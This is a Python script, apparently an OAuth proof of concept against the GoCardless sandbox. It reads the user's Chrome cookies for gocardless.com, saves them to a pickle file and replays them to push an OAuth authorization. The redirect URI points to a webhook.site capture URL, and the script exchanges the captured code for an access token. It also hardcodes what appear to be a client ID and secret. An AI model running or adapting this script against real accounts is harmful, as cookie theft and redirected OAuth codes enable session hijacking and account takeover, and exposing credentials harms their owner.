import requests
import browser_cookie3
import pickle
from urllib.parse import urlparse, parse_qs

# ---------------- Config ----------------
BASE = "https://connect-sandbox.gocardless.com"
CLIENT_ID = "HObcHCa6I9A6qLEK9Dp0sC90orA_cHN7eeLuJGGvHw4zhoJVs5sQ6LmjrLnXSd6x"
CLIENT_SECRET = "Z5d1jVrzeHgCnf7L4SC2REFFzcIb1GhJ3IlpRqkfCjYxLpnFYr3UGeC_-VwjPYrJ"
REDIRECT_URI = "https://webhook.site/cda54e31-a1c7-4103-8f92-c4d73d4a9c51"

COOKIE_FILE = "saved_cookies.pkl"


# --------------- Cookie Helpers ----------------
def load_browser_cookies():
    print("[+] Loading cookies from Chrome...")
    cj = browser_cookie3.chrome(domain_name="gocardless.com")
    return cj


def save_cookies(cj):
    """
    Convert RequestsCookieJar to simple dict list and save safely
    """
    print("[+] Saving cookies locally...")
    cookies_list = []
    for c in cj:
        cookies_list.append(
            {
                "name": c.name,
                "value": c.value,
                "domain": c.domain,
                "path": c.path,
                "secure": c.secure,
                "expires": c.expires,
            }
        )
    with open(COOKIE_FILE, "wb") as f:
        pickle.dump(cookies_list, f)


def load_saved_cookies():
    """
    Load cookies from file and rebuild RequestsCookieJar
    """
    print("[+] Loading saved cookies from file...")
    with open(COOKIE_FILE, "rb") as f:
        cookies_list = pickle.load(f)

    session_cookies = requests.cookies.RequestsCookieJar()
    for c in cookies_list:
        session_cookies.set(
            name=c["name"],
            value=c["value"],
            domain=c["domain"],
            path=c["path"],
            secure=c.get("secure", False),
            expires=c.get("expires"),
        )
    return session_cookies


# --------------- Session & OAuth ----------------
def create_session(cookie_jar):
    session = requests.Session()
    session.cookies.update(cookie_jar)
    return session


def start_oauth_flow(session):
    print("[+] Starting OAuth flow...")

    params = {
        "scope": "read_write",
        "client_id": CLIENT_ID,
        "redirect_uri": REDIRECT_URI,
        "response_type": "code",
        "state": "research123",
    }

    r = session.get(f"{BASE}/oauth/authorize", params=params, allow_redirects=False)
    return r


def follow_redirects(session, response):
    while response.status_code in [301, 302]:
        location = response.headers.get("Location")
        print(f"[+] Redirect → {location}")

        if location.startswith("/"):
            location = BASE + location

        response = session.get(location, allow_redirects=False)

    return response


def extract_code(final_url):
    parsed = urlparse(final_url)
    query = parse_qs(parsed.query)
    return query.get("code", [None])[0]


def exchange_code(code):
    print("[+] Exchanging authorization code for access token...")
    data = {
        "grant_type": "authorization_code",
        "code": code,
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "redirect_uri": REDIRECT_URI,
    }
    r = requests.post(f"{BASE}/oauth/token", data=data)
    print("[+] Token response:")
    print(r.json())


# --------------- Main Script ----------------
if __name__ == "__main__":
    # Step 1: Load cookies from Chrome
    browser_cookies = load_browser_cookies()

    # Step 2: Save cookies safely to file
    save_cookies(browser_cookies)

    # Step 3: Load saved cookies into RequestsCookieJar
    saved_cookies = load_saved_cookies()

    # Step 4: Create session with cookies
    session = create_session(saved_cookies)

    # Step 5: Start OAuth flow
    r = start_oauth_flow(session)

    # Step 6: Follow redirects manually
    final_response = follow_redirects(session, r)
    print("[+] Final URL:", final_response.url)

    # Step 7: Extract authorization code
    code = extract_code(final_response.url)
    if code:
        print("[+] Authorization Code:", code)
        # Optional: Exchange for access token
        exchange_code(code)
    else:
        print("[-] No authorization code found.")
